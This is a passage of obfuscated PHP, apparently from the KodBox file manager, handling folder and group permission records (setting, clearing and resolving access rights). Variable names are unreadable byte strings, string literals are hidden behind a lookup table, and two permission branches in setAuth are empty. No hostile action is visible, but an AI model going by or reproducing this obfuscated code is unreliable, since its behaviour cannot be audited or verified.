$ŒÁĞ±©ö[193]); foreach ($Âş˜ÇÌ× as $Ô°†…µ™) { $ß×»É¨Œ[$Ô°†…µ™] = $¾ÑÁïŒ¡[$Ô°†…µ™] ? $¾ÑÁïŒ¡[$Ô°†…µ™] : array(); } if ($Ú±ğ’) { return $¡Ï·å©ú; } return $¾ÑÁïŒ¡; } public function setAuth($Ãƒ›‘áˆ, $–ÏŒÖ‚¦) { $˜şÊÂù¾ =& $_SERVER[ÔÕ±ĞšÎ]; $ŒÂò•… = Model($˜şÊÂù¾[1423])->sourceInfo($Ãƒ›‘áˆ); if (!$ŒÂò•…) { return !1; } if ($ŒÂò•…[$˜şÊÂù¾[190]] != SourceModel::TYPE_GROUP) { return !1; } $°ß·Ò„ = 1; $Í¶˜´š = $ŒÂò•…[$˜şÊÂù¾[571]]; if ($Í¶˜´š != $°ß·Ò„) { $É¯œûõ = array($˜şÊÂù¾[1978] => $Í¶˜´š); $ˆ Ëöí = Model($˜şÊÂù¾[2073])->field($˜şÊÂù¾[1777])->where($É¯œûõ)->select(); $ˆ Ëöí = array_to_keyvalue($ˆ Ëöí, $˜şÊÂù¾[12], $˜şÊÂù¾[1777]); } $©µÁîÁ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ßæˆå‡ = array(); foreach ($–ÏŒÖ‚¦ as $¹‰Ñ“ñ ) { if (!in_array($¹‰Ñ“ñ [$˜şÊÂù¾[190]], $©µÁîÁ)) { show_json(LNG($˜şÊÂù¾[2166]), !1); } if ($Í¶˜´š != $°ß·Ò„) { if ($¹‰Ñ“ñ [$˜şÊÂù¾[190]] == SourceModel::TYPE_GROUP) { } if ($¹‰Ñ“ñ [$˜şÊÂù¾[571]] != 0 && !in_array($¹‰Ñ“ñ [$˜şÊÂù¾[571]], $ˆ Ëöí)) { } } if ($¹‰Ñ“ñ [$˜şÊÂù¾[571]] == 0) { $¹‰Ñ“ñ [$˜şÊÂù¾[190]] = SourceModel::TYPE_USER; } $ßæˆå‡[] = array($˜şÊÂù¾[193] => $Ãƒ›‘áˆ, $˜şÊÂù¾[190] => intval($¹‰Ñ“ñ [$˜şÊÂù¾[190]]), $˜şÊÂù¾[571] => intval($¹‰Ñ“ñ [$˜şÊÂù¾[571]]), $˜şÊÂù¾[2087] => intval($¹‰Ñ“ñ [$˜şÊÂù¾[2087]]) ? intval($¹‰Ñ“ñ [$˜şÊÂù¾[2087]]) : 0, $˜şÊÂù¾[2148] => intval($¹‰Ñ“ñ [$˜şÊÂù¾[2148]]) ? intval($¹‰Ñ“ñ [$˜şÊÂù¾[2148]]) : -1); } $this->where(array($˜şÊÂù¾[493] => $Ãƒ›‘áˆ))->delete(); $this->addAll($ßæˆå‡); return !0; } public function authClear($ºê’á“§) { $‹½‘ıå„ =& $_SERVER[ÔÕ±ĞšÎ]; $ªîÀ¬œ³ = Model($‹½‘ıå„[1423])->sourceInfo($ºê’á“§); $Ç•†ùÔ = array($ºê’á“§); if ($ªîÀ¬œ³[$‹½‘ıå„[487]] == $‹½‘ıå„[91]) { $ê•İÓ±ğ = array($‹½‘ıå„[657] => array($‹½‘ıå„[617], $ªîÀ¬œ³[$‹½‘ıå„[586]] . $ºê’á“§ . $‹½‘ıå„[618])); $Ç•†ùÔ = Model($‹½‘ıå„[1423])->field($‹½‘ıå„[493])->where($ê•İÓ±ğ)->getField($‹½‘ıå„[193], !0); $Ç•†ùÔ[] = $ºê’á“§; } $this->where(array($‹½‘ıå„[493] => array($‹½‘ıå„[494], $Ç•†ùÔ)))->delete(); return !0; } public function getAllChildren($“ı©ğÀÏ) { $œ§áá© =& $_SERVER[ÔÕ±ĞšÎ]; $îÛ×ªüÓ = Model($œ§áá©[1423])->sourceInfo($“ı©ğÀÏ); if ($îÛ×ªüÓ[$œ§áá©[487]] != $œ§áá©[91]) { return $this->sourceListAuth(array($“ı©ğÀÏ)); } if ($îÛ×ªüÓ[$œ§áá©[190]] != SourceModel::TYPE_GROUP) { return array(); } $ø­×ÒµÎ = 1; $ß”Û·ô = array($“ı©ğÀÏ); if ($îÛ×ªüÓ[$œ§áá©[192]] == $œ§áá©[230] && $îÛ×ªüÓ[$œ§áá©[571]] != $ø­×ÒµÎ) { $ß”Û·ô = $this->groupChidldAllRootSource($îÛ×ªüÓ[$œ§áá©[571]]); } $è×¸£÷„ = $this->field($œ§áá©[193])->group($œ§áá©[193])->select(); $è×¸£÷„ = array_to_keyvalue($è×¸£÷„, $œ§áá©[12], $œ§áá©[193]); if (!$è×¸£÷„) { return array(); } $¤ÑÏ„Ìû = $œ§áá©[2167]; $õ×åö§Œ = array($œ§áá©[193] => array($œ§áá©[7], $è×¸£÷„), $œ§áá©[507] => $œ§áá©[230]); $ÈÃà÷¦ï = Model($œ§áá©[899])->field($¤ÑÏ„Ìû)->where($õ×åö§Œ)->select(); $Ê¢•Ğ§ê = array($“ı©ğÀÏ); foreach ($ÈÃà÷¦ï as $¸ÌÌÒ¨÷) { foreach ($ß”Û·ô as $¼ÂôÕ’¬) { $òí½´àÍ = $œ§áá©[50] . $¼ÂôÕ’¬ . $œ§áá©[50]; $ªú÷Üä£ = $¸ÌÌÒ¨÷[$œ§áá©[586]] . $¸ÌÌÒ¨÷[$œ§áá©[193]] . $œ§áá©[50]; if (strstr($ªú÷Üä£, $òí½´àÍ)) { $Ê¢•Ğ§ê[] = $¸ÌÌÒ¨÷[$œ§áá©[193]]; break; } } } return $this->sourceListAuth($Ê¢•Ğ§ê); } private function sourceListAuth($â­ë½›ö) { $±è¸Á•Ç =& $_SERVER[ÔÕ±ĞšÎ]; $éÉå”ƒ¤ = Model($±è¸Á•Ç[1423])->sourceListInfo($â­ë½›ö, !0); $ˆê ¶ˆÉ = $this->sourceAuthSelect($â­ë½›ö); $¿ôâÀä° = array(); $™İæ¤Ù† = array(); foreach ($éÉå”ƒ¤ as $½Éû¿Ÿ¾) { unset($½Éû¿Ÿ¾[$±è¸Á•Ç[531]]); unset($½Éû¿Ÿ¾[$±è¸Á•Ç[529]]); unset($½Éû¿Ÿ¾[$±è¸Á•Ç[489]]); unset($½Éû¿Ÿ¾[$±è¸Á•Ç[90]]); $³®óÂáô = $ˆê ¶ˆÉ[$½Éû¿Ÿ¾[$±è¸Á•Ç[193]]]; if (!$³®óÂáô) { continue; } $½Éû¿Ÿ¾[$±è¸Á•Ç[2168]] = $this->authTargetInfo($³®óÂáô); $½Éû¿Ÿ¾[$±è¸Á•Ç[584]] = rtrim($½Éû¿Ÿ¾[$±è¸Á•Ç[590]], $±è¸Á•Ç[8]) . $±è¸Á•Ç[8] . ltrim($½Éû¿Ÿ¾[$±è¸Á•Ç[584]], $±è¸Á•Ç[8]); $¿ôâÀä°[] = $½Éû¿Ÿ¾; $‚¢ºÈÆñ = count(explode($±è¸Á•Ç[8], trim($½Éû¿Ÿ¾[$±è¸Á•Ç[584]], $±è¸Á•Ç[8]))); $™İæ¤Ù†[] = $‚¢ºÈÆñ + ($½Éû¿Ÿ¾[$±è¸Á•Ç[33]] == $±è¸Á•Ç[78] ? 0 : 1000); } array_multisort($™İæ¤Ù†, SORT_ASC, $¿ôâÀä°); return $¿ôâÀä°; } private function groupChidldAllRootSource($öÍæ‡Êå) { $üƒÖˆø =& $_SERVER[ÔÕ±ĞšÎ]; $Ç¾üõŞ¬ = Model($üƒÖˆø[2169])->groupChildrenAll($öÍæ‡Êå); $ñ—­†™Ì = array($üƒÖˆø[192] => 0, $üƒÖˆø[571] => array($üƒÖˆø[7], $Ç¾üõŞ¬), $üƒÖˆø[190] => SourceModel::TYPE_GROUP); $¡ƒîû¬® = Model($üƒÖˆø[899])->field($üƒÖˆø[193])->where($ñ—­†™Ì)->select(); $¡ƒîû¬® = array_to_keyvalue($¡ƒîû¬®, $üƒÖˆø[12], $üƒÖˆø[193]); return $¡ƒîû¬®; } private function authTargetInfo($’éÌæü) { $¡Ù¨‰Ù± =& $_SERVER[ÔÕ±ĞšÎ]; $Ş˜ô§ÉÖ = array(); $èªÃóÌÓ = array(); $Š¤ÃÂ—Ï = 2 << 25; foreach ($’éÌæü as $”ü”¹¶ú) { $ªÀà† = Model($¡Ù¨‰Ù±[573])->listData($”ü”¹¶ú[$¡Ù¨‰Ù±[2087]]); if (!$ªÀà†) { continue; } if ($”ü”¹¶ú[$¡Ù¨‰Ù±[190]] == SourceModel::TYPE_USER) { $”“„şÇ‘ = Model($¡Ù¨‰Ù±[579])->getInfoSimpleOuter($”ü”¹¶ú[$¡Ù¨‰Ù±[571]]); if ($”“„şÇ‘[$¡Ù¨‰Ù±[1777]] == $¡Ù¨‰Ù±[1275]) { continue; } if ($”“„şÇ‘[$¡Ù¨‰Ù±[1777]] == $¡Ù¨‰Ù±[230]) { $”“„şÇ‘[$¡Ù¨‰Ù±[32]] = LNG($¡Ù¨‰Ù±[2170]); } } else { $”“„şÇ‘ = Model($¡Ù¨‰Ù±[587])->getInfoSimple($”ü”¹¶ú[$¡Ù¨‰Ù±[571]]); } if (!$”“„şÇ‘) { continue; } $”“„şÇ‘[$¡Ù¨‰Ù±[542]] = $ªÀà†; $Ş˜ô§ÉÖ[] = $”“„şÇ‘; $áĞ½Ö¸Ÿ = 0; if ($”ü”¹¶ú[$¡Ù¨‰Ù±[190]] == SourceModel::TYPE_GROUP) { $áĞ½Ö¸Ÿ = $Š¤ÃÂ—Ï * 2; } if ($”ü”¹¶ú[$¡Ù¨‰Ù±[190]] == SourceModel::TYPE_USER) { $áĞ½Ö¸Ÿ = $Š¤ÃÂ—Ï; } if ($”ü”¹¶ú[$¡Ù¨‰Ù±[190]] == SourceModel::TYPE_USER && $”ü”¹¶ú[$¡Ù¨‰Ù±[571]] == $¡Ù¨‰Ù±[230]) { $áĞ½Ö¸Ÿ = 0; } $èªÃóÌÓ[] = $ªÀà†[$¡Ù¨‰Ù±[489]] + $áĞ½Ö¸Ÿ; } array_multisort($èªÃóÌÓ, SORT_DESC, $Ş˜ô§ÉÖ); return $Ş˜ô§ÉÖ; } public function getAllChildrenByUser($Á£¸„Æš, $ñêœúÙ”) { $×µ‰ã­ =& $_SERVER[ÔÕ±ĞšÎ]; $½Ã×‰Éè = Model($×µ‰ã­[599])->getInfo($ñêœúÙ”); if (!$ñêœúÙ” || !$Á£¸„Æš || !$½Ã×‰Éè) { return array(); } $æëÉşÒ = Model($×µ‰ã­[1423])->sourceInfo($Á£¸„Æš); $ˆøÅ¹¨¾ = array(); $›˜ûçàî = 1; if ($æëÉşÒ[$×µ‰ã­[192]] == $×µ‰ã­[230] && $æëÉşÒ[$×µ‰ã­[571]] != $›˜ûçàî && $this->groupContainUser($æëÉşÒ[$×µ‰ã­[571]], $ñêœúÙ”)) { foreach ($½Ã×‰Éè[$×µ‰ã­[2171]] as $Ş×‰çÙ†) { $ò¬¥ŸôÈ = Model($×µ‰ã­[587])->getInfo($Ş×‰çÙ†[$×µ‰ã­[1978]]); $à»Õ…Ë = Model($×µ‰ã­[599])->getInfoSimpleOuter($ñêœúÙ”); $à»Õ…Ë[$×µ‰ã­[542]] = $Ş×‰çÙ†[$×µ‰ã­[489]]; if (Model($×µ‰ã­[573])->authCheckAction($Ş×‰çÙ†[$×µ‰ã­[489]][$×µ‰ã­[489]], $×µ‰ã­[1999])) { continue; } $ğÕˆÎğ° = array($×µ‰ã­[32] => $×µ‰ã­[1295] . $ò¬¥ŸôÈ[$×µ‰ã­[32]], $×µ‰ã­[193] => $ò¬¥ŸôÈ[$×µ‰ã­[90]][$×µ‰ã­[193]], $×µ‰ã­[87] => KodIO::make($ò¬¥ŸôÈ[$×µ‰ã­[90]][$×µ‰ã­[193]]), $×µ‰ã­[192] => $×µ‰ã­[230], $×µ‰ã­[190] => $×µ‰ã­[580], $×µ‰ã­[33] => $×µ‰ã­[621], $×µ‰ã­[584] => $ò¬¥ŸôÈ[$×µ‰ã­[591]], $×µ‰ã­[1978] => $ò¬¥ŸôÈ[$×µ‰ã­[1978]], $×µ‰ã­[588] => $ò¬¥ŸôÈ[$×µ‰ã­[192]], $×µ‰ã­[2168] => array($à»Õ…Ë)); $ˆøÅ¹¨¾[$ğÕˆÎğ°[$×µ‰ã­[193]]] = $ğÕˆÎğ°; } } $íÎ¤Ú®³ = array(); $á–ĞÖÈå = $this->getAllChildren($Á£¸„Æš); foreach ($á–ĞÖÈå as $®™®áû) { $†Ê²»¦ù = !1; foreach ($®™®áû[$×µ‰ã­[2168]] as $×šõ¶ì’) { if ($×šõ¶ì’[$×µ‰ã­[1777]]) { if ($×šõ¶ì’[$×µ‰ã­[1777]] == $ñêœúÙ”) { $†Ê²»¦ù = !0; break; } } if ($×šõ¶ì’[$×µ‰ã­[1978]]) { if ($this->groupContainUser($×šõ¶ì’[$×µ‰ã­[1978]], $ñêœúÙ”)) { $†Ê²»¦ù = !0; break; } } } if ($†Ê²»¦ù) { $íÎ¤Ú®³[] = $®™®áû; } $Ûû¡İÕ° = $®™®áû[$×µ‰ã­[193]]; if (isset($ˆøÅ¹¨¾[$Ûû¡İÕ°])) { $®™®áû[$×µ‰ã­[2168]][] = $ˆøÅ¹¨¾[$Ûû¡İÕ°][0]; $ˆøÅ¹¨¾[$Ûû¡İÕ°] = !1; } } $ˆøÅ¹¨¾ = array_filter(array_values($ˆøÅ¹¨¾)); $íÎ¤Ú®³ = array_merge($ˆøÅ¹¨¾, $íÎ¤Ú®³); return $íÎ¤Ú®³; } public function setAllChildrenByUser($ÊÓÅ²Ìñ, $¯èéĞØû, $ˆ×®åï) { $ÕÓ Ñõú =& $_SERVER[ÔÕ±ĞšÎ]; $é¶¢ş©Ä = $this->getAllChildrenByUser($ÊÓÅ²Ìñ, $¯èéĞØû); if (!$ˆ×®åï || !$é¶¢ş©Ä) { return !1; } foreach ($é¶¢ş©Ä as $†Ñ…×ì£) { $º‰¯ø°ö = array(); foreach ($†Ñ…×ì£[$ÕÓ Ñõú[2168]] as $»³‚Î€ä) { $½şµ©¬é = $»³‚Î€ä[$ÕÓ Ñõú[542]]; $¸šÎ‘éÇ = $»³‚Î€ä[$ÕÓ Ñõú[1777]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $“Ü¨ÀÑ  = $»³‚Î€ä[$ÕÓ Ñõú[1777]] ? $»³‚Î€ä[$ÕÓ Ñõú[1777]] : $»³‚Î€ä[$ÕÓ Ñõú[1978]]; if ($»³‚Î€ä[$ÕÓ Ñõú[1777]] && $»³‚Î€ä[$ÕÓ Ñõú[1777]] == $¯èéĞØû) { continue; } $º‰¯ø°ö[] = array($ÕÓ Ñõú[193] => $†Ñ…×ì£[$ÕÓ Ñõú[193]], $ÕÓ Ñõú[190] => $¸šÎ‘éÇ, $ÕÓ Ñõú[571] => intval($“Ü¨ÀÑ ), $ÕÓ Ñõú[2087] => isset($½şµ©¬é[$ÕÓ Ñõú[477]]) ? intval($½şµ©¬é[$ÕÓ Ñõú[477]]) : 0, $ÕÓ Ñõú[2148] => isset($½şµ©¬é[$ÕÓ Ñõú[2148]]) ? intval($½şµ©¬é[$ÕÓ Ñõú[2148]]) : -1); } $º‰¯ø°ö[] = array($ÕÓ Ñõú[193] => $†Ñ…×ì£[$ÕÓ Ñõú[193]], $ÕÓ Ñõú[190] => SourceModel::TYPE_USER, $ÕÓ Ñõú[571] => intval($¯èéĞØû), $ÕÓ Ñõú[2087] => intval($ˆ×®åï), $ÕÓ Ñõú[2148] => -1); $this->where(array($ÕÓ Ñõú[493] => $†Ñ…×ì£[$ÕÓ Ñõú[193]]))->delete(); $this->addAll($º‰¯ø°ö); } return !0; } public function get($±ÅÙ¾ö•) { $ä¥À‡éû = $this->getSourceList(array($±ÅÙ¾ö•), !0); return $ä¥À‡éû[0]; } public function getSourceList($©ÚÏÁˆ£, $Ãóáè¼« = false, $™ï±ÁÖí = false) { $ñØ‡Ù… =& $_SERVER[ÔÕ±ĞšÎ]; if (!$©ÚÏÁˆ£) { return array(); } $¹ã±üõ‚ = Model($ñØ‡Ù…[1423]); if (!$Ãóáè¼« && count($©ÚÏÁˆ£) == 1) { $Ãóáè¼« = array(); $Ãóáè¼«[$©ÚÏÁˆ£[0]] = $¹ã±üõ‚->sourceInfo($©ÚÏÁˆ£[0]); } if (!$Ãóáè¼«) { $•Úò¼™„ = array($ñØ‡Ù…[493] => array($ñØ‡Ù…[494], $©ÚÏÁˆ£)); $Ãóáè¼« = $¹ã±üõ‚->field($ñØ‡Ù…[2172])->where($•Úò¼™„)->select(); $Ãóáè¼« = array_to_keyvalue($Ãóáè¼«, $ñØ‡Ù…[193]); } $ã˜³Á± = $©ÚÏÁˆ£; foreach ($Ãóáè¼« as $ØÜ¾ù‰ƒ => $•Æš ) { $¥¸½–É = $¹ã±üõ‚->parentLevelArray($•Æš [$ñØ‡Ù…[586]]); $ã˜³Á± = array_merge($ã˜³Á±, array($ØÜ¾ù‰ƒ), array_reverse($¥¸½–É)); } $ã˜³Á± = array_values(array_unique($ã˜³Á±)); if (!$ã˜³Á±) { return array(); } $À™ªÄş‚ = $this->sourceAuthSelect($ã˜³Á±); $ù…—ñåæ = array(); foreach ($ã˜³Á± as $‘ó½Û©) { if (isset($À™ªÄş‚[$‘ó½Û©])) { $ù…—ñåæ[$‘ó½Û©] = $À™ªÄş‚[$‘ó½Û©]; } } $³Û †‰Ø = $this->userIsRoot($™ï±ÁÖí); $åÊæ“Êß = AuthModel::authAll(); $æÅÓíËü = array($ñØ‡Ù…[490] => $åÊæ“Êß, $ñØ‡Ù…[2173] => array($ñØ‡Ù…[495] => 0, $ñØ‡Ù…[1984] => $åÊæ“Êß, $ñØ‡Ù…[496] => LNG($ñØ‡Ù…[2174]), $ñØ‡Ù…[2001] => $ñØ‡Ù…[2175])); $ê¦Íµ¸Ä = array(); foreach ($Ãóáè¼« as $‘ó½Û© => $²›İ™ÔŠ) { if ($³Û †‰Ø && $GLOBALS[$ñØ‡Ù…[6]][$ñØ‡Ù…[1997]]) { $ê¦Íµ¸Ä[$‘ó½Û©] = $æÅÓíËü; continue; } $ê¦Íµ¸Ä[$‘ó½Û©] = $this->makeSourceAuth($²›İ™ÔŠ, $ù…—ñåæ, $™ï±ÁÖí); } return $ê¦Íµ¸Ä; } public function authDeepCheck($™öÓÓ±©, $Á†ŞüÓ = false) { $Ãñ³ğ« =& $_SERVER[ÔÕ±ĞšÎ]; $Á†ŞüÓ = $Á†ŞüÓ ? $Á†ŞüÓ : USER_ID; $×ĞéÊÅç = $this->makeAuthDeep($Á†ŞüÓ); if (!in_array($™öÓÓ±©, $×ĞéÊÅç[$Ãñ³ğ«[2176]])) { return !1; } $è×½èÍâ = array(); foreach ($×ĞéÊÅç[$Ãñ³ğ«[2177]] as $ğÛœÇ® => $£—õÃÉ) { if (!in_array($™öÓÓ±©, $£—õÃÉ)) { continue; } $è×½èÍâ[] = $ğÛœÇ®; } if (!$è×½èÍâ) { return !1; } $ıËĞê±Â = $è×½èÍâ ? $è×½èÍâ[0] : $™öÓÓ±©; return array($Ãñ³ğ«[490] => -1, $Ãñ³ğ«[542] => array($Ãñ³ğ«[495] => $Ãñ³ğ«[1275], $Ãñ³ğ«[1984] => $Ãñ³ğ«[230], $Ãñ³ğ«[496] => LNG($Ãñ³ğ«[2178]), $Ãñ³ğ«[2001] => $Ãñ³ğ«[2179]), $Ãñ³ğ«[2180] => LNG($Ãñ³ğ«[2181]), $Ãñ³ğ«[2182] => $this->sourceAuthInfo($ıËĞê±Â)); } protected function makeAuthDeep($¸“šµÀÌ = false) { $ÅÊ×ığ‘ =& $_SERVER[ÔÕ±ĞšÎ]; static $æè­¤ÍÒ = array(); $¸“šµÀÌ = $¸“šµÀÌ ? $¸“šµÀÌ : USER_ID; if (isset($æè­¤ÍÒ[$¸“šµÀÌ])) { return $æè­¤ÍÒ[$¸“šµÀÌ]; } $ô•ÓıŸñ = Model($ÅÊ×ığ‘[2183])->listData(); $æ‘À¾úÌ = array(); foreach ($ô•ÓıŸñ as $ˆ¨Ò©·×) { if ($ˆ¨Ò©·×[$ÅÊ×ığ‘[489]] == 0 && $ˆ¨Ò©·×[$ÅÊ×ığ‘[2000]] == $ÅÊ×ığ‘[91]) { $æ‘À¾úÌ[] = $ˆ¨Ò©·×[$ÅÊ×ığ‘[477]]; } } $³Á÷ÊîÙ = $this->userGroupParents($¸“šµÀÌ); $Í”¡¿Í† = array($ÅÊ×ığ‘[190] => SourceModel::TYPE_USER, $ÅÊ×ığ‘[571] => $¸“šµÀÌ); if ($³Á÷ÊîÙ) { $Í”¡¿Í† = array(array($ÅÊ×ığ‘[190] => SourceModel::TYPE_USER, $ÅÊ×ığ‘[571] => $¸“šµÀÌ), array($ÅÊ×ığ‘[190] => SourceModel::TYPE_GROUP, $ÅÊ×ığ‘[571] => array($ÅÊ×ığ‘[494], $³Á÷ÊîÙ)), $ÅÊ×ığ‘[1079] => $ÅÊ×ığ‘[2081]); } $¢óâ½®› = $this->field($ÅÊ×ığ‘[2184])->where($Í”¡¿Í†)->select(); $°Ÿô‚‚• = array(); $ûñ³°¥è = array_to_keyvalue_group($¢óâ½®›, $ÅÊ×ığ‘[193]); foreach ($ûñ³°¥è as $£Ô·½Ç˜ => $ …êèŞ¬) { $®­­÷éø = $this->authArrayCheck($ …êèŞ¬, $¸“šµÀÌ); if ($®­­÷éø[$ÅÊ×ığ‘[490]] > 0) { $°Ÿô‚‚•[] = $£Ô·½Ç˜ . $ÅÊ×ığ‘[12]; } } if ($³Á÷ÊîÙ) { $§Ç±»Î˜ = Model($ÅÊ×ığ‘[587]); foreach ($³Á÷ÊîÙ as $Ã’¢âª›) { $°Æ˜ïÈ¶ = $§Ç±»Î˜->getInfo($Ã’¢âª›); if (!$°Æ˜ïÈ¶ || !is_array($°Æ˜ïÈ¶[$ÅÊ×ığ‘[90]])) { continue; } $°Ÿô‚‚•[] = $°Æ˜ïÈ¶[$ÅÊ×ığ‘[90]][$ÅÊ×ığ‘[193]]; } } $Ùí‚ËÛĞ = array(); $ßò­¾’ü = $³Á÷ÊîÙ; $êÜ‰À… = Model($ÅÊ×ığ‘[1423]); $§Ç±»Î˜ = Model($ÅÊ×ığ‘[587]); $æ¥°ò²Ç = array(); $€Ì”½Ÿ‹ = array(); $¿‡Ş¨¥ = array(); $şßçŸş = array(); if ($°Ÿô‚‚•) { $ûÏ‚²²ä = $êÜ‰À…->where(array($ÅÊ×ığ‘[193] => array($ÅÊ×ığ‘[494], $°Ÿô‚‚•)))->select(); foreach ($ûÏ‚²²ä as $›ñä¦¨Ï) { if ($›ñä¦¨Ï[$ÅÊ×ığ‘[507]] == $ÅÊ×ığ‘[91]) { continue; } $³Âşı· = $êÜ‰À…->parentLevelArray($›ñä¦¨Ï[$ÅÊ×ığ‘[586]]); $Ùí‚ËÛĞ = array_merge($Ùí‚ËÛĞ, $³Âşı·); $ßò­¾’ü[] = $›ñä¦¨Ï[$ÅÊ×ığ‘[571]]; $æ¥°ò²Ç[$›ñä¦¨Ï[$ÅÊ×ığ‘[193]]] = $³Âşı·; $€Ì”½Ÿ‹[$›ñä¦¨Ï[$ÅÊ×ığ‘[193]]] = $›ñä¦¨Ï[$ÅÊ×ığ‘[571]]; } } $ßò­¾’ü = array_values(array_unique($ßò­¾’ü)); $ë´ñ¿Ûñ = $ßò­¾’ü; foreach ($ë´ñ¿Ûñ as $Ã’¢âª›) { $°Æ˜ïÈ¶ = $§Ç±»Î˜->getInfo($Ã’¢âª›); $³Âşı· = $êÜ‰À…->parentLevelArray($°Æ˜ïÈ¶[$ÅÊ×ığ‘[586]]); $ßò­¾’ü = array_merge($ßò­¾’ü, $³Âşı·); } $ßò­¾’ü = array_values(array_unique($ßò­¾’ü)); foreach ($ßò­¾’ü as $Ã’¢âª›) { $°Æ˜ïÈ¶ = $§Ç±»Î˜->getInfo($Ã’¢âª›); $Ùí‚ËÛĞ[] = $°Æ˜ïÈ¶[$ÅÊ×ığ‘[90]][$ÅÊ×ığ‘[193]]; $¿‡Ş¨¥[$Ã’¢âª›] = $°Æ˜ïÈ¶[$ÅÊ×ığ‘[90]][$ÅÊ×ığ‘[193]]; $şßçŸş[$Ã’¢âª›] = $êÜ‰À…->parentLevelArray($°Æ˜ïÈ¶[$ÅÊ×ığ‘[586]]); } foreach ($æ¥°ò²Ç as $ğ½…Ìê˜ => $¼ª¨“‡È) { $üæ‡¥®Ë = $€Ì”½Ÿ‹[$ğ½…Ìê˜]; if (!$üæ‡¥®Ë || !$¿‡Ş¨¥[$üæ‡¥®Ë]) { continue; } $çéƒâıù = array(); foreach ($şßçŸş[$üæ‡¥®Ë] as $Ã’¢âª›) { $çéƒâıù[] = $¿‡Ş¨¥[$Ã’¢âª›]; } $æ¥°ò²Ç[$ğ½…Ìê˜] = array_merge($çéƒâıù, $¼ª¨“‡È); } $Ùí‚ËÛĞ = array_values(array_unique($Ùí‚ËÛĞ)); $ÎÄ’ÕØà = array($ÅÊ×ığ‘[2176] => $Ùí‚ËÛĞ, $ÅÊ×ığ‘[2177] => $æ¥°ò²Ç); $æè­¤ÍÒ[$¸“šµÀÌ] = $ÎÄ’ÕØà; return $ÎÄ’ÕØà; } private function makeSourceAuth($—ƒ‰óå‚, $ûÍíÏŠö, $«‚Çµ› = false) { $ êî¼Ã« =& $_SERVER[ÔÕ±ĞšÎ]; $ õëñŠî = $ êî¼Ã«[91]; $÷ìïÙ¸¦ = $—ƒ‰óå‚[$ êî¼Ã«[571]]; $èË»–Â¤ = $—ƒ‰óå‚[$ êî¼Ã«[190]] == SourceModel::TYPE_GROUP; $ïä¢’¢ = $èË»–Â¤ ? $this->groupRootAuth($÷ìïÙ¸¦, $«‚Çµ›) : !1; if ($ïä¢’¢ && Model($ êî¼Ã«[573])->authCheckAction($ïä¢’¢[$ êî¼Ã«[489]], $ êî¼Ã«[1999])) { return $this->groupAuthInfo($ïä¢’¢, $÷ìïÙ¸¦); } $ØÈƒ¯÷Ñ = Model($ êî¼Ã«[1423])->parentLevelArray($—ƒ‰óå‚[$ êî¼Ã«[586]]); $ØÈƒ¯÷Ñ = array_merge(array($—ƒ‰óå‚[$ êî¼Ã«[193]]), array_reverse($ØÈƒ¯÷Ñ)); $Œ§¾ìÓ = !1; foreach ($ØÈƒ¯÷Ñ as $•Ô°ƒÜ) { if (!isset($ûÍíÏŠö[$•Ô°ƒÜ])) { continue; } $¶¤É¢“ = $this->authMake($ûÍíÏŠö[$•Ô°ƒÜ], $«‚Çµ›); if ($¶¤É¢“[$ êî¼Ã«[542]]) { $Œ§¾ìÓ = $¶¤É¢“; break; } } if (!$èË»–Â¤) { return $Œ§¾ìÓ; } if (!$Œ§¾ìÓ && $ïä¢’¢) { $Œ§¾ìÓ = $this->groupAuthInfo($ïä¢’¢, $÷ìïÙ¸¦); } if (!$Œ§¾ìÓ) { $¾å€­Èé = Model($ êî¼Ã«[587])->getInfo($÷ìïÙ¸¦); $ŞÇíÊ = explode($ êî¼Ã«[50], trim($¾å€­Èé[$ êî¼Ã«[586]], $ êî¼Ã«[50])); $ŞÇíÊ = array_reverse($ŞÇíÊ); foreach ($ŞÇíÊ as $¬—Ôù©Õ) { if ($¬—Ôù©Õ == $ êî¼Ã«[230] || $¬—Ôù©Õ == $ õëñŠî) { continue; } $œÇŠ†Ò = $this->groupRootAuth($¬—Ôù©Õ, $«‚Çµ›); if (!$œÇŠ†Ò) { continue; } $Œ§¾ìÓ = $this->groupAuthInfo($œÇŠ†Ò, $¬—Ôù©Õ); break; } } if (!$Œ§¾ìÓ || $Œ§¾ìÓ[$ êî¼Ã«[490]] <= 0) { $ºäƒæ¨Û = $this->authDeepCheck($—ƒ‰óå‚[$ êî¼Ã«[193]], $«‚Çµ›); if ($ºäƒæ¨Û) { $Œ§¾ìÓ = $ºäƒæ¨Û; } } return $Œ§¾ìÓ; } private function userIsRoot($¾½‘Ğü› = false) { $Ñ‚­İÓÏ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$¾½‘Ğü› && KodUser::isRoot()) { return !0; } $·€ıë© = Model($Ñ‚­İÓÏ[599])->getInfo($¾½‘Ğü›); $†òÃ„–³ = Model($Ñ‚­İÓÏ[2185])->listData($·€ıë©[$Ñ‚­İÓÏ[2186]]); if ($†òÃ„–³ && $†òÃ„–³[$Ñ‚­İÓÏ[577]][$Ñ‚­İÓÏ[2187]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Œ—¯÷Ì”) { $û‡…ùÒ¢ =& $_SERVER[ÔÕ±ĞšÎ]; $Ö‰‡â’° = Model($û‡…ùÒ¢[1423]); $æÓ§ú€Š = $Ö‰‡â’°->sourceInfo($Œ—¯÷Ì”); if (!$æÓ§ú€Š) { return !1; } $Ö‰‡â’°->groupPathDisplay($æÓ§ú€Š); $™¶ùÚú• = array($æÓ§ú€Š); $™¶ùÚú• = $Ö‰‡â’°->_listAppendPath($™¶ùÚú•); $æÓ§ú€Š = $™¶ùÚú•[0]; $§«å†Ãö = $æÓ§ú€Š[$û‡…ùÒ¢[584]]; if (isset($æÓ§ú€Š[$û‡…ùÒ¢[592]])) { $Ğ¯òĞšö = explode($û‡…ùÒ¢[8], trim($æÓ§ú€Š[$û‡…ùÒ¢[584]], $û‡…ùÒ¢[8])); array_shift($Ğ¯òĞšö); $§«å†Ãö = $æÓ§ú€Š[$û‡…ùÒ¢[590]] . $û‡…ùÒ¢[2188] . implode($û‡…ùÒ¢[8], $Ğ¯òĞšö); } return array($û‡…ùÒ¢[496] => $æÓ§ú€Š[$û‡…ùÒ¢[32]], $û‡…ùÒ¢[87] => KodIO::make($æÓ§ú€Š[$û‡…ùÒ¢[193]]), $û‡…ùÒ¢[2189] => $§«å†Ãö); } private function groupAuthInfo($ãù˜©¥, $÷Ó…Ğ«¡) { $×«¾ÀÏ’ =& 